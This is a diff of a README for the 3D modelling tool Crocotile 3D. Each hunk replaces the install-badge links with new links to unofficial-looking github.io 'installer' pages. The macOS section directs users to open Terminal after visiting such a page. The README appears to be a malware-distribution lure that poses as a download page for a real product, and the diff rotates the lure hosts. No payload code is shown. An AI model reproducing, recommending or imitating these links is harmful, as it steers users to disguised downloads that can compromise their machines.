@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Crocotile 3D](https://img.shields.io/badge/⬇_Install_Crocotile+3D-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Install Crocotile 3D](https://img.shields.io/badge/⬇_Install_Crocotile+3D-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -61,9 +61,9 @@ Crocotile 3D is a 3D tile-based modeling tool for creating retro-style 3D scenes
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 </div>
 
@@ -81,7 +81,7 @@ Crocotile 3D is a 3D tile-based modeling tool for creating retro-style 3D scenes
 
 <div align="center">
 
-[![⬇ Install Crocotile 3D](https://img.shields.io/badge/⬇_Install_Crocotile+3D-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Install Crocotile 3D](https://img.shields.io/badge/⬇_Install_Crocotile+3D-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -100,7 +100,7 @@ Crocotile 3D is a 3D tile-based modeling tool for creating retro-style 3D scenes
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -125,7 +125,7 @@ Crocotile 3D is a 3D tile-based modeling tool for creating retro-style 3D scenes
 
 <div align="center">
 
-[![⬇ Install Crocotile 3D](https://img.shields.io/badge/⬇_Install_Crocotile+3D-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Install Crocotile 3D](https://img.shields.io/badge/⬇_Install_Crocotile+3D-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
